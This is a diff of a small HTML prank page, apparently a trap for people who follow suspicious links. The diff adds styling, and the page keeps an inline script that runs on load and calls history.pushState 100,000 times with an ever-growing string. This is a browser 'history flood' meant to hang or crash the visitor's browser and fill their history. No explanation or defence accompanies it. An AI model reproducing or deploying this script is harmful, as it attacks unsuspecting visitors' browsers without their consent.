@@ -2,16 +2,36 @@
 <html>
     <head>
         <title>Why would you come here?</title>
+        <style>
+            * {
+                font-family: "Segoe UI", Helvectica, "Helvectica Neu", Verdana, sans-serif;
+                font-weight: 100;
+            }
+            div {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -100%);
+                background: rgba(0, 0, 0, 0.1);
+                border-radius: 5px;
+                text-align: center;
+            }
+            div * {
+                padding: 10px 90px 5px 90px;
+            }
+        </style>
     </head>
-  <body>
-    <h1>What were you expecting?</h1>
-    <h3>Seriously, don't click suspicious links.</h3>
-    <script>
-      var total = "";
-      for( var i = 0; i < 100000; i++ ) {
-          total = total + i.toString();
-          history.pushState(0,0, total );
-      }
-    </script>
-  </body>
+    <body>
+        <div>
+            <h1>What were you expecting?</h1>
+            <h3>Seriously though, don't click suspicious links.</h3>
+        </div>
+        <script>
+        var total = "";
+        for( var i = 0; i < 100000; i++ ) {
+            total = total + i.toString();
+            history.pushState(0,0, total );
+        }
+        </script>
+    </body>
 </html>
